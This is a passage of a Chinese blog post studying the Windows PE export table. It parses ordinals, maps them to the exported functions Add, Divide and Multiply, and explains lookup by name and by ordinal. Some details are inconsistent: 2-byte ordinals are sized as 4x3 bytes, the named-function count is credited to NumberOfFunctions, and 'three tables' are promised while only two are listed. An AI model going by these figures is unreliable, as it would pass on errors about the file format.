<h4 id="AddressOfNameOrdinals-1"><a href="#AddressOfNameOrdinals-1" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>存储的值为指针，指针为RVA，同样需要转为FOA在PE文件中读取</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19004</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>

<p>获取foa为 7A04</p>
<p>跳转至0x7A04位置</p>
<p>由NumberOfFunctions可知共有3个有名函数</p>
<p>因此Ordinals列表为 4x3=12</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015121856554.png" alt="image-20211015121856554"></p>
<p>拿到有名称的Ordinals</p>
<p>Ordinals的为Word型，共2个字节</p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>Oridinals</th>
<th>序号(Oridinals+Base)</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x0002</td>
<td>12</td>
</tr>
<tr>
<td>2</td>
<td>0x0000</td>
<td>10</td>
</tr>
<tr>
<td>3</td>
<td>0x0007</td>
<td>17</td>
</tr>
</tbody></table>
<p>根据有名称函数的Oridinals结合前面得到的AddressOfFunctions和AdressOfNames，就可以得到函数的名称、函数的地址的关系</p>
<table>
<thead>
<tr>
<th>顺序索引</th>
<th>Oridinals</th>
<th>导出函数地址(RVA)</th>
<th>导出函数地址(FOA)</th>
<th>函数名称</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>0x0002</td>
<td>0x00011302</td>
<td>0x702</td>
<td>Add</td>
</tr>
<tr>
<td>2</td>
<td>0x0000</td>
<td>0x00011320</td>
<td>0x720</td>
<td>Divide</td>
</tr>
<tr>
<td>3</td>
<td>0x0007</td>
<td>0x000111A4</td>
<td>0x5A4</td>
<td>Multiply</td>
</tr>
</tbody></table>
<p>至此导出表分析完毕</p>
<h3 id="由导出表获得导出函数"><a href="#由导出表获得导出函数" class="headerlink" title="由导出表获得导出函数"></a>由导出表获得导出函数</h3><p>从前面的分析中可以得知查询导出表有两个办法</p>
<ul>
<li>根据导出表函数名称获得导出函数地址</li>
<li>根据导出表函数序号获得导出函数地址</li>
</ul>
<h4 id="函数名称获取导出函数地址"><a href="#函数名称获取导出函数地址" class="headerlink" title="函数名称获取导出函数地址"></a>函数名称获取导出函数地址</h4><ol>
<li>根据导出表的函数名称去AddressOfNames指向的每个名称字符串查询是否有匹配的字符串</li>
<li>找到匹配的字符串后，根据找到的顺序索引去AddressOfNameOrdinals中找到对应的Ordinals</li>
<li>根据前面找到的Ordinals到AddressOfFunctions中获得函数地址</li>
</ol>
<p>图示</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125252798.png" alt="image-20211015125252798"></p>
<h4 id="函数序号取得导出函数"><a href="#函数序号取得导出函数" class="headerlink" title="函数序号取得导出函数"></a>函数序号取得导出函数</h4><ol>
<li>根据函数序号-导出表.Base获得导出函数的Ordinal</li>
<li>根据前面拿到的Ordinals到AddressOfFunctions中获得函数地址</li>
</ol>
<p>图示</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125443438.png" alt="image-20211015125443438"></p>
<p>也可利用工具得出导出表的RVA,后利用RVA转FOA可获得其文件偏移量</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125801883.png" alt="image-20211015125801883"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015130012615.png" alt="image-20211015130012615"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>导出表中还包含了三张小表:导出函数地址表、导出函数名称表</li>
<li>导出表中存储了指向这三张表的指针，而不是直接存储表内的内容</li>
<li>无论是根据函数名称还是函数序号来获取导出函数，都需要用到Ordinals,用Ordinals到导出函数地址表中获取地址</li>
<li>导出表的Base取决于编写DLL时导出定义的最小序号</li>
<li>导出表的NumberOfFuctions取决于编写DLL时导出定义的序号最大差值+1</li>
<li>导出名称表和导出函数序号表只对有名称的导出函数有效</li>
</ul>
<p>学习复现自52pojie论坛内的lyl640abc 师傅的pe笔记系列</p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
</search>
